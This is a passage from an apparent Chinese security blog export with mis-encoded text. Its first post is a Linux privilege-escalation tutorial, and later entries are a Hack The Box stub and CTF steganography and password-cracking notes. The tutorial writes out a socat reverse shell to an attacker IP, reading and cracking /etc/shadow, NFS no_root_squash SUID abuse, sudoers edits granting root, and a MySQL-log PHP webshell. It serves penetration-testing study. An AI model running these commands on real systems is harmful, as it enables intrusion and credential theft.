<h5 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h5><blockquote>
<p>é€šè¿‡è°ƒç”¨linuxçš„systemå‡½æ•°æ¥æ‰“å¼€bashã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901224431624.png" alt="image-20220901224431624"></p>
<h5 id="man"><a href="#man" class="headerlink" title="man"></a>man</h5><blockquote>
<p>é€šè¿‡sudo man manå‘½ä»¤æ¥æ‰“å¼€mançš„ä½¿ç”¨æ‰‹å†Œï¼ŒåŒæ—¶ä¼šè¿›å…¥ç¼–è¾‘è¡Œï¼Œè¾“å…¥!bashå›è½¦ï¼Œå¯è·å–rootæƒé™ã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901224541655.png" alt="image-20220901224541655"></p>
<p><img src="/post/Linux-PowerUp/image-20220901224551402.png" alt="image-20220901224551402"></p>
<h5 id="vi"><a href="#vi" class="headerlink" title="*vi"></a>*vi</h5><blockquote>
<p><code>sudo vi</code>ä¼šè¿›å…¥vié»˜è®¤é¡µï¼Œè¾“å…¥<code>:!bash</code>å›è½¦ï¼Œå¯è¿›å…¥<code>root</code>å‘½ä»¤è¡Œã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901224609706.png" alt="image-20220901224609706"></p>
<p><img src="/post/Linux-PowerUp/image-20220901224622369.png" alt="image-20220901224622369"></p>
<h5 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h5><blockquote>
<p>å¦‚æœsudoerså®šä¹‰äº†å¯ä»¥æ‰§è¡ŒæŸä¸ªè„šæœ¬ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥æŠŠè¿”å›shellçš„ä»£ç æ·»åŠ è¿›å»ã€‚</p>
</blockquote>
<p>ä¾‹å¦‚æ¡Œé¢æœ‰ä¸ªè¿ç»´éœ€è¦çš„aaa.shæ–‡ä»¶ï¼Œæˆ‘ä»¬æ·»åŠ ä¸€æ®µæ‰“å¼€bashçš„ä»£ç ï¼Œç„¶åsudoè¿è¡Œå³å¯ã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220901224639423.png" alt="image-20220901224639423"></p>
<p>å‚è€ƒä»£ç ï¼š</p>
<p><img src="/post/Linux-PowerUp/image-20220901224909264.png" alt="image-20220901224909264"></p>
<h4 id="åº”ç”¨ç¨‹åº"><a href="#åº”ç”¨ç¨‹åº" class="headerlink" title="åº”ç”¨ç¨‹åº"></a><strong>åº”ç”¨ç¨‹åº</strong></h4><blockquote>
<p>é™¤äº†ä¸Šé¢çš„ä¸€äº›äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸€äº›åº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥è·å–rootæƒé™ï¼Œä¾‹å¦‚envã€ftpã€socatã€scpã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901225004858.png" alt="image-20220901225004858"></p>
<h5 id="env"><a href="#env" class="headerlink" title="env"></a>env</h5><blockquote>
<p>é€šè¿‡envç¯å¢ƒå˜é‡æ¥è·å–rootæƒé™ã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901225022285.png" alt="image-20220901225022285"></p>
<h5 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h5><blockquote>
<p>é€šè¿‡ftpæ¥è¿›å…¥bashè·å–rootæƒé™ã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901225031965.png" alt="image-20220901225031965"></p>
<h5 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h5><blockquote>
<p>é€šè¿‡socatå®¢æˆ·ç«¯è¿æ¥æ”»å‡»æœºï¼Œæ”»å‡»æœºå¯è·å¾—rootshellã€‚å…ˆæ‰§è¡ŒæœåŠ¡ç«¯ï¼Œåæ‰§è¡Œå®¢æˆ·ç«¯ã€‚</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo socat <span class="built_in">exec</span>:<span class="string">&#x27;sh -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444</span><br><span class="line">æ”»å‡»æœºæ‰§è¡Œï¼š</span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>

<p><img src="/post/Linux-PowerUp/image-20220901225047468.png" alt="image-20220901225047468"></p>
<p><img src="/post/Linux-PowerUp/image-20220901225056003.png" alt="image-20220901225056003"></p>
<h5 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h5><blockquote>
<p>è¿˜æœ‰ä¸€ä¸ªscpï¼Œscpæ˜¯ä¸€ä¸ªå®‰å…¨å¤åˆ¶æ–‡ä»¶çš„å‘½ä»¤ï¼Œå®ƒæ— æ³•è·å–ä¸€ä¸ªshellï¼Œä½†å¯ä»¥ç”¨æ¥å¤åˆ¶ä¸€äº›ç³»ç»Ÿçš„æ•æ„Ÿæ–‡ä»¶ã€‚ä¾‹å¦‚etc&#x2F;passwdã€etc&#x2F;shadowç­‰ã€‚</p>
<p>å¦‚ä¸‹å‘½ä»¤ï¼Œå°†passwdæ–‡ä»¶ä¼ è¾“åˆ°æŒ‡å®šæœºå™¨çš„root&#x2F;Desktopä¸‹ï¼Œç„¶åå†å¯¹å¯†ç è¿›è¡Œç ´è§£ç­‰æ“ä½œã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901225110501.png" alt="image-20220901225110501"></p>
<h4 id="é»‘åå•æƒ…å†µ"><a href="#é»‘åå•æƒ…å†µ" class="headerlink" title="é»‘åå•æƒ…å†µ"></a><strong>é»‘åå•æƒ…å†µ</strong></h4><blockquote>
<p>å¦‚æœç¢°åˆ°sudoersæ–‡ä»¶ä½¿ç”¨é»‘åå•çš„æƒ…å†µï¼Œæ¯”å¦‚è¯´æƒé™ç¦ç”¨sudoä½¿ç”¨findå‘½ä»¤ï¼Œä½†æ˜¯éƒ½æ˜¯åœ¨ALLåŸºç¡€ä¸Šè®¾ç½®çš„ï¼Œé‚£ä¹ˆå¯ä»¥cpæŠŠfindå¤åˆ¶åˆ°å…¶å®ƒç›®å½•è¿è¡Œã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901225127772.png" alt="image-20220901225127772"></p>
<h2 id="3-NFSé…ç½®ä¸å½“å¯¼è‡´ææƒ"><a href="#3-NFSé…ç½®ä¸å½“å¯¼è‡´ææƒ" class="headerlink" title="3) NFSé…ç½®ä¸å½“å¯¼è‡´ææƒ"></a>3) NFSé…ç½®ä¸å½“å¯¼è‡´ææƒ</h2><h3 id="NFSä»‹ç»"><a href="#NFSä»‹ç»" class="headerlink" title="NFSä»‹ç»"></a>NFSä»‹ç»</h3><blockquote>
<p>NFSæ˜¯network file systemç¼©å†™ï¼Œç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œç”¨æ¥æŒ‚åœ¨æŸä¸ªç›®å½•æˆ–æ–‡ä»¶è¿›è¡Œå…±äº«ï¼Œé»˜è®¤æ˜¯2049ç«¯å£ï¼ŒåŠŸèƒ½ç±»ä¼¼äºwindowsçš„å…±äº«ã€‚</p>
</blockquote>
<p>è¿™é‡Œä»¥ubuntuä¸ºä¾‹ï¼Œç®€å•é…ç½®ä¸€ä¸‹ï¼š</p>
<p>é¦–å…ˆå®‰è£…nfsæœåŠ¡ç«¯ï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install nfs-kernel-<span class="keyword">server</span></span><br></pre></td></tr></table></figure>

<p>å®‰è£…åä¿®æ”¹é…ç½®æ–‡ä»¶&#x2F;etc&#x2F;exportsï¼Œè¿™é‡Œå°†homeç›®å½•è¿›è¡ŒæŒ‚è½½å…±äº«ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">/home *(rw,no_root_squash)</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­&#x2F;homeæ˜¯è¦æŒ‚è½½çš„ç›®å½•ï¼Œ*ä»£è¡¨å…è®¸è¿æ¥çš„ä¸»æœºï¼Œè¿™é‡Œæ˜¯æ‰€æœ‰ï¼Œrwæ˜¯è¯»å†™æƒé™ï¼Œno_root_squashä»£è¡¨å®¢æˆ·ç«¯å…è®¸ä»¥rootæƒé™è®¿é—®nfsã€‚</p>
<p>éšåé‡å¯ç›¸å…³æœåŠ¡ï¼š</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"># nfsé€šè¿‡rpcé€šä¿¡ï¼Œè¿™é‡ŒæŠŠrpcbindä¹Ÿé‡å¯ä¸‹sudo <span class="regexp">/etc/</span><span class="keyword">init</span>.d<span class="regexp">/rpcbind restartsudo /</span>etc<span class="regexp">/init.d/</span>nfs<span class="operator">-</span>kernel<span class="operator">-</span>server restart</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å°±é…ç½®å¥½äº†ï¼Œå¯ä»¥é€šè¿‡showmountå‘½ä»¤æ¥åˆ—å‡ºç›®æ ‡æœºçš„å…±äº«ç›®å½•ï¼Œeå‚æ•°æ˜¾ç¤ºNFSæœåŠ¡å™¨çš„è¾“å‡ºæ¸…å•ã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220901231323392.png" alt="image-20220901231323392"></p>
<p>æˆ–è€…é€šè¿‡nmapçš„ç›¸å…³è„šæœ¬æ¥è¿›è¡Œæ‰«æã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220901231334381.png" alt="image-20220901231334381"></p>
<h3 id="NFSé…ç½®ä¸å½“å¯ææƒ"><a href="#NFSé…ç½®ä¸å½“å¯ææƒ" class="headerlink" title="NFSé…ç½®ä¸å½“å¯ææƒ"></a><strong>NFSé…ç½®ä¸å½“å¯ææƒ</strong></h3><blockquote>
<p>å½“nfsé…ç½®äº†è¯»å†™æƒé™ï¼Œä¸”å…è®¸å®¢æˆ·ç«¯ä»¥rootè®¿é—®æ—¶ï¼Œå°±ä¼šå­˜åœ¨å®‰å…¨éšæ‚£ã€‚</p>
</blockquote>
<p>æµ‹è¯•å¦‚ä¸‹ï¼š</p>
<p>é¦–å…ˆå®¢æˆ·ç«¯æŠŠç›®æ ‡æœºnfsçš„å…±äº«æŒ‚è½½åˆ°æœ¬åœ°ï¼Œç„¶åæŠŠbashå¤åˆ¶è¿›å»å¹¶èµ‹äºˆsuidæƒé™ï¼Œæ“ä½œå¦‚ä¸‹å›¾ã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220901231351979.png" alt="image-20220901231351979"></p>
<p>æ­¤æ—¶ç›®æ ‡æœºçš„homeç›®å½•ä¸‹å°±ä¼šæœ‰ä¸€ä¸ªå…·æœ‰suidæƒé™çš„bashã€‚</p>
<p>æ™®é€šç”¨æˆ·æ‰§è¡Œå³å¯è·å–rootæƒé™ï¼Œè¿™é‡Œæ³¨æ„éœ€è¦åŠ ä¸Š<code>p</code>å‚æ•°ï¼Œå¦åˆ™æƒé™è¿˜æ˜¯å½“å‰ç”¨æˆ·çš„ã€‚</p>
<p><code>p</code>å‚æ•°è¯´æ˜ï¼šä¸æä¾›çš„æƒ…å†µä¸‹ï¼Œæ‰“å¼€bashæƒé™æ˜¯å½“å‰å®é™…ç”¨æˆ·ï¼Œæä¾›çš„æƒ…å†µä¸‹ï¼Œä¼šæ‰“å¼€ç‰¹æƒæ¨¡å¼ï¼Œåƒä¸Šç»§æ‰¿<code>suid</code>ï¼Œå› ä¸ºbashæœ‰<code>suid</code>æƒé™ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯rootã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220901231410196.png" alt="image-20220901231410196"></p>
<p>ä½¿ç”¨åœºæ™¯ï¼šè¿™ä¸ªå’Œ<code>suid</code>ææƒå¾ˆåƒï¼Œç»™ç¨‹åºèµ‹äºˆ<code>suid</code>æƒé™ç„¶ååˆ©ç”¨ã€‚ä¸åŒçš„æ˜¯å‰ä¸¤ç¯‡<code>suid</code>ææƒæ˜¯å½“å‰ç”¨æˆ·ä½¿ç”¨<code>sudo  chmod</code>è‡ªå·±ä¿®æ”¹çš„ï¼Œåœ¨<code>sudoers</code>ç¦ç”¨<code>sudo</code>å‘½ä»¤ç­‰æƒ…å†µä¸‹ï¼Œå°±è¡Œä¸é€šäº†ã€‚è€Œ<code>nfs</code>é…ç½®åˆ©ç”¨ï¼Œæ˜¯å®¢æˆ·ç«¯æŒ‚è½½åˆ°æœ¬åœ°èµ‹æƒçš„ï¼Œç›®æ ‡æœºçš„æ™®é€šç”¨æˆ·åªéœ€æ‰§è¡Œå°±å¯ä»¥ã€‚</p>
<p>åŒç†ï¼Œä¹‹å‰æ€»ç»“çš„<code>suid</code>ææƒçš„é‚£äº›ç¨‹åºä¹ŸåŒæ ·é€‚ç”¨ï¼Œè¿™é‡Œå°±ä¸å†è®°äº†ã€‚</p>
<h3 id="å…¶å®ƒå‘½ä»¤"><a href="#å…¶å®ƒå‘½ä»¤" class="headerlink" title="å…¶å®ƒå‘½ä»¤"></a><strong>å…¶å®ƒå‘½ä»¤</strong></h3><p>é™¤äº†å¯ä»¥ç›´æ¥å¾—åˆ°<code>shell</code>çš„ï¼Œè¿˜æœ‰å…¶ä»–ä¸€äº›ç¨‹åºä¸èƒ½ç›´æ¥è·å–ï¼Œä¾‹å¦‚<code>nanoã€vi</code>ç­‰ã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220901231423093.png" alt="image-20220901231423093"></p>
<p>ç„¶åä½¿ç”¨<code>nano -p</code>æ¥è¯»å–<code>shadow</code>æ–‡ä»¶ï¼Œè¿™é‡Œè¯»å–æ—¶æŠŠç›¸å…³è®°å½•å¤åˆ¶å‡ºæ¥ï¼Œä½¿ç”¨<code>john</code>ç ´è§£ï¼Œæµ‹è¯•ä¸èƒ½é‡å®šå‘ï¼Œéœ€è¦æƒé™ï¼Œæ‰€ä»¥åªèƒ½å¤åˆ¶ã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220901231435125.png" alt="image-20220901231435125"></p>
<p>å¤åˆ¶åä½¿ç”¨<code>john</code>ç ´è§£è·å–ç›¸å…³ç”¨æˆ·å¯†ç ï¼Œä»¥<code>root</code>ä¸ºä¾‹ï¼Œå¯†ç æ˜¯<code>root</code>ã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220901231451129.png" alt="image-20220901231451129"></p>
<p>å¦‚æœå¯†ç å¤ªå¤æ‚ï¼Œç ´è§£ä¸äº†ï¼Œåˆ™å¯ä»¥å°è¯•å…¶å®ƒç”¨æˆ·ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œç›®æ ‡æœºæ˜¯<code>aaa</code>ç”¨æˆ·ï¼Œç ´è§£<code>aaa</code>å¯†ç ä¸º<code>aaa</code>ã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220901231505353.png" alt="image-20220901231505353"></p>
<p>è¿™æ—¶å€™ä¸ç¡®å®š<code>aaa</code>æ˜¯å¦ä¸º<code>root</code>æƒé™ï¼Œåˆ™å¯ä»¥ç»§ç»­ä½¿ç”¨<code>nano</code>å»ç¼–è¾‘<code>passwd</code>æ–‡ä»¶ï¼Œç»™<code>aaa</code>èµ‹æƒã€‚</p>
<p>æŠŠåŸæ¥çš„<code>1001</code>æ¢æˆ<code>0</code>.</p>
<p><img src="/post/Linux-PowerUp/image-20220901231516388.png" alt="image-20220901231516388"></p>
<p>ç„¶ååˆ‡æ¢<code>aaa</code>ç”¨æˆ·å³å¯ã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220901231524654.png" alt="image-20220901231524654"></p>
<p>åˆ©ç”¨è¿™ç§æœºåˆ¶ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥ä¿®æ”¹<code>sudoers</code>æ–‡ä»¶ï¼Œæ·»åŠ æˆ–ä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ã€‚</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">aaa     <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>:<span class="keyword">ALL</span>) NOPASSWD:<span class="keyword">ALL</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åä½¿ç”¨<code>sudo bash</code>æˆ–<code>sudo su</code>è·å–<code>root</code>æƒé™ã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220901231537204.png" alt="image-20220901231537204"></p>
<h2 id="4ï¼‰Mysqlææƒ"><a href="#4ï¼‰Mysqlææƒ" class="headerlink" title="4ï¼‰Mysqlææƒ"></a>4ï¼‰Mysqlææƒ</h2><h3 id="1ã€é€šè¿‡mysqlæ—¥å¿—åŠŸèƒ½"><a href="#1ã€é€šè¿‡mysqlæ—¥å¿—åŠŸèƒ½" class="headerlink" title="1ã€é€šè¿‡mysqlæ—¥å¿—åŠŸèƒ½"></a>1ã€é€šè¿‡mysqlæ—¥å¿—åŠŸèƒ½</h3><blockquote>
<p><code>SHOW VARIABLES LIKE &#39;general%&#39; æŸ¥è¯¢æ—¥å¿—</code></p>
<p><code>set global general_log = &quot;ON&quot;; å¼€å¯æ—¥å¿—è®°å½•</code></p>
<p><code>set global general_log_file=&#39;C://phpStudy//PHPTutorial//WWW//shell.php&#39;; è®¾ç½®æ—¥å¿—è·¯å¾„</code></p>
<p><code>select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;; å†™å…¥ä¸€å¥è¯</code></p>
</blockquote>
<p><img src="https://pic4.zhimg.com/80/v2-a4aea75eafabcf886d91113ba2822717_720w.webp" alt="img"></p>
<p><img src="https://pic3.zhimg.com/80/v2-fa69f44df8bfd5f44a8d6a11dad9a55e_720w.webp" alt="img"></p>
<p>è¿æ¥æˆåŠŸ</p>
<h2 id="5ï¼‰ç¯å¢ƒå˜é‡ææƒ"><a href="#5ï¼‰ç¯å¢ƒå˜é‡ææƒ" class="headerlink" title="5ï¼‰ç¯å¢ƒå˜é‡ææƒ"></a>5ï¼‰ç¯å¢ƒå˜é‡ææƒ</h2><p><code>nepctf2023é‡åˆ°</code></p>
<hr>
]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>htbã®Machines</title>
    <url>//post/htb(Machines)/</url>
    <content><![CDATA[<p><code>Machines</code></p>
<span id="more"></span>

<h1 id="Machines"><a href="#Machines" class="headerlink" title="Machines"></a>Machines</h1><h2 id="ã€WEBã€‘Analytics-easy"><a href="#ã€WEBã€‘Analytics-easy" class="headerlink" title="ã€WEBã€‘Analytics[easy]"></a>ã€WEBã€‘Analytics[easy]</h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
</blockquote>
]]></content>
      <categories>
        <category>Hack the Box</category>
      </categories>
      <tags>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>å¯†ç +æ‚é¡¹é¢˜ç®€å•è®°å½•</title>
    <url>//post/crypto+misc/</url>
    <content><![CDATA[<p><code>åªä¼šwebï¼Œå¾—åˆ†å¤ªå°‘ï¼Œè¿˜æ˜¯æç‚¹å¯†ç å’Œæ‚é¡¹æ¥æé«˜ä¸€ä¸‹</code></p>
<span id="more"></span>

<h2 id="1-ä¸€èˆ¬åŠ å¯†"><a href="#1-ä¸€èˆ¬åŠ å¯†" class="headerlink" title="1.ä¸€èˆ¬åŠ å¯†"></a>1.ä¸€èˆ¬åŠ å¯†</h2><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">ç›´æ¥ç”¨kaliçš„</span><br><span class="line"></span><br><span class="line">ciphey -<span class="built_in">t</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-SSTVå›¾åƒå£°éŸ³-Audacityæ³¢å½¢å£°éŸ³"><a href="#2-SSTVå›¾åƒå£°éŸ³-Audacityæ³¢å½¢å£°éŸ³" class="headerlink" title="2.SSTVå›¾åƒå£°éŸ³&#x2F;Audacityæ³¢å½¢å£°éŸ³"></a>2.SSTVå›¾åƒå£°éŸ³&#x2F;Audacityæ³¢å½¢å£°éŸ³</h2><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">ç”¨wi<span class="symbol">n10</span>ä¸Š</span><br><span class="line"></span><br><span class="line">MMSSTVå·¥å…·è§£æå£°éŸ³ï¼Œæœ€å¥½ç”¨è™šæ‹Ÿå£°å¡è¿™æ ·å¯ä»¥å±è”½ä¸€äº›æ‚éŸ³ã€æŠŠå£°éŸ³ç»™MMSSTVå¬ã€‘</span><br><span class="line"></span><br><span class="line">Audacityè§£æå£°éŸ³æ³¢å½¢å¾—åˆ°æ³¢å½¢å›¾åƒä»è€Œå¾—åˆ°flag</span><br></pre></td></tr></table></figure>

<h2 id="3-åŠ å¯†å‹ç¼©åŒ…"><a href="#3-åŠ å¯†å‹ç¼©åŒ…" class="headerlink" title="3.åŠ å¯†å‹ç¼©åŒ…"></a>3.åŠ å¯†å‹ç¼©åŒ…</h2><h3 id="1ï¼‰win10"><a href="#1ï¼‰win10" class="headerlink" title="*1ï¼‰win10"></a>*1ï¼‰win10</h3><p>ç”¨<code>win10</code>å·¥å…·çˆ†ç ´å‹ç¼©åŒ…å¯†ç </p>
<h3 id="2ï¼‰kali"><a href="#2ï¼‰kali" class="headerlink" title="2ï¼‰kali"></a>2ï¼‰kali</h3><p><code>kali john</code>çˆ†ç ´å‹ç¼©åŒ…</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">zip2john å‹ç¼©åŒ…çš„åå­—<span class="string">.zip</span> &gt;&gt; passwdhash.txt</span><br></pre></td></tr></table></figure>

<h2 id="4-å›¾ç‰‡éšå†™"><a href="#4-å›¾ç‰‡éšå†™" class="headerlink" title="4.å›¾ç‰‡éšå†™"></a>4.å›¾ç‰‡éšå†™</h2><h3 id="1ï¼‰win10-1"><a href="#1ï¼‰win10-1" class="headerlink" title="1ï¼‰win10"></a>1ï¼‰win10</h3><p>åˆ©ç”¨<code>Stegsolve</code>è§£æå›¾ç‰‡éšå†™å†…å®¹</p>
<h3 id="2ï¼‰kali-1"><a href="#2ï¼‰kali-1" class="headerlink" title="*2ï¼‰kali"></a>*2ï¼‰kali</h3><p><code>zsteg</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">zsteg</span> å›¾ç‰‡</span><br></pre></td></tr></table></figure>

<h2 id="5-é›¶å®½å­—ç¬¦éšå†™"><a href="#5-é›¶å®½å­—ç¬¦éšå†™" class="headerlink" title="5.é›¶å®½å­—ç¬¦éšå†™"></a>5.é›¶å®½å­—ç¬¦éšå†™</h2><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>æˆ‘ä»¬å¼€å§‹çœ‹è¿™ä¸ªå†…å®¹æ˜¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜çš„ï¼Œä½†æ˜¯åº•ä¸‹çš„</p>
<p><code>ç¬¬7è¡Œï¼Œç¬¬204åˆ—</code></p>
<p>è¯´æ˜é‡Œé¢æœ‰å…¶ä»–æˆ‘ä»¬æ— æ³•çœ‹åˆ°çš„å­—ç¬¦å­˜åœ¨</p>
<p><img src="/post/crypto+misc/image-20220927160630959.png" alt="image-20220927160630959"></p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>vim</code>è¯»å–ä¸€ä¸‹è¿™ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå°±ä¼šå‘ç°é‡Œé¢å¤šäº†å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦</p>
<p><img src="/post/crypto+misc/image-20220927160526722.png" alt="image-20220927160526722"></p>
<p>è¿™äº›å°±æ˜¯<code>é›¶å®½å­—ç¬¦</code></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ä»ä¸­è¯»å–ä¿¡æ¯å‘¢</p>
<p>è¿™é‡Œå°±éœ€è¦ä¸‹é¢è¿™ä¸ªç½‘ç«™çš„ï¼Œå¯¹æ–‡æœ¬çš„<code>é›¶å®½å­—ç¬¦åŠ å¯†</code>å’Œ<code>é›¶å®½å­—ç¬¦è§£å¯†</code>åŠŸèƒ½</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">330</span>k.github.io<span class="regexp">/misc_tools/u</span>nicode_steganography.html</span><br></pre></td></tr></table></figure>

<p>å…ˆé€‰å¥½å‡ºç°çš„å­—ç¬¦ç±»å‹</p>
<p><img src="/post/crypto+misc/image-20220927161233239.png" alt="image-20220927161233239"></p>
<p>ç„¶å</p>
<p><img src="/post/crypto+misc/image-20220927161257809.png" alt="image-20220927161257809"></p>
<p>å¾—åˆ°éšè—å†…å®¹</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="number">86</span>MygAZ<span class="number">2</span>uJi<span class="number">2</span>oCxctsd<span class="number">28</span>LB<span class="symbol">NRXHPLykF5</span>LBz<span class="number">8</span>f<span class="number">1</span>xEikW<span class="symbol">NVpKfpce2</span>CMHvhSJUdk<span class="number">7</span>CHLrEVhGRVQvMwT<span class="number">8</span>r<span class="number">7</span>JUgVWGb<span class="symbol">nzxb</span></span><br></pre></td></tr></table></figure>

<p>ç”¨<code>ciphey</code> å¾—åˆ°<code>flag</code></p>
<p><img src="/post/crypto+misc/image-20220927161352763.png" alt="image-20220927161352763"></p>
<h2 id="6-éšè—ç§˜å¯†-flag-åˆ°å›¾ç‰‡ã€éŸ³ä¹"><a href="#6-éšè—ç§˜å¯†-flag-åˆ°å›¾ç‰‡ã€éŸ³ä¹" class="headerlink" title="6.éšè—ç§˜å¯†(flag)åˆ°å›¾ç‰‡ã€éŸ³ä¹"></a>6.éšè—ç§˜å¯†(flag)åˆ°å›¾ç‰‡ã€éŸ³ä¹</h2><h3 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h3><p><code>Silenteye</code></p>
<p><img src="/post/crypto+misc/image-20220927162235740.png" alt="image-20220927162235740"></p>
<p>æŠŠå›¾ç‰‡æˆ–è€…å£°éŸ³æ‹–å…¥å…¶ä¸­</p>
<p><img src="/post/crypto+misc/image-20220927162311232.png" alt="image-20220927162311232"></p>
<p>ç„¶åæ‰§è¡Œ<code>Decode</code></p>
<p><img src="/post/crypto+misc/image-20220927162351939.png" alt="image-20220927162351939"></p>
<p>å¾—åˆ°åŠ å¯†ä¿¡æ¯</p>
<p>ç”¨<code>ciphey</code> å¾—åˆ°<code>flag</code></p>
<p><img src="/post/crypto+misc/image-20220927162441904.png" alt="image-20220927162441904"></p>
<h2 id="7-å°æ¸¸æˆ"><a href="#7-å°æ¸¸æˆ" class="headerlink" title="7.å°æ¸¸æˆ"></a>7.å°æ¸¸æˆ</h2><h3 id="win10-1"><a href="#win10-1" class="headerlink" title="win10"></a>win10</h3><p><code>CEä¿®æ”¹å™¨ï¼Œæ‡‚å¾—éƒ½æ‡‚</code></p>
<h2 id="8-Javaç±»çš„"><a href="#8-Javaç±»çš„" class="headerlink" title="8.Javaç±»çš„"></a>8.Javaç±»çš„</h2><p>åˆ©ç”¨<code>jd-gui</code>å¯¹javaåæ±‡ç¼–ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä¿¡æ¯</p>
<h2 id="9-äºŒç»´ç "><a href="#9-äºŒç»´ç " class="headerlink" title="9.äºŒç»´ç "></a>9.äºŒç»´ç </h2><h3 id="1ï¼‰ç¼ºå°‘å®šä½ç‚¹"><a href="#1ï¼‰ç¼ºå°‘å®šä½ç‚¹" class="headerlink" title="1ï¼‰ç¼ºå°‘å®šä½ç‚¹"></a>1ï¼‰ç¼ºå°‘å®šä½ç‚¹</h3><p><img src="/post/crypto+misc/image-20220927163933448.png" alt="image-20220927163933448"></p>
<p>åˆ©ç”¨<code>ps</code>æŠŠä¸¤è€…æ‹¼æ¥èµ·æ¥å°±å¯ä»¥äº†</p>
<h2 id="10-åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶"><a href="#10-åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶" class="headerlink" title="10.åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶"></a>10.åˆ†ç¦»å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶</h2><p><a href="https://blog.csdn.net/qq_43531669/article/details/113732757">åŸæ–‡é“¾æ¥</a></p>
<h3 id="1ï¼‰å›¾ç‰‡åˆ†æ"><a href="#1ï¼‰å›¾ç‰‡åˆ†æ" class="headerlink" title="1ï¼‰å›¾ç‰‡åˆ†æ:"></a>1ï¼‰å›¾ç‰‡åˆ†æ:</h3><p>å¦‚å›¾ä¸ºCTFé¢˜ç›®ä¸­ä¸€ä¸ªéšè—æ–‡ä»¶çš„å›¾ç‰‡</p>
<p>é¦–å…ˆå¯¹å›¾ç‰‡è¿›è¡Œåˆ†æï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸ªå·¥å…·binwalkï¼ˆkaliä¸­æ˜¯è‡ªå¸¦çš„ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½åˆ°windowsä¸­ä½¿ç”¨ï¼‰ã€‚</p>
<p>ä½¿ç”¨æ–¹æ³•ï¼šbinwalk + æ–‡ä»¶è·¯å¾„&#x2F;æ–‡ä»¶å</p>
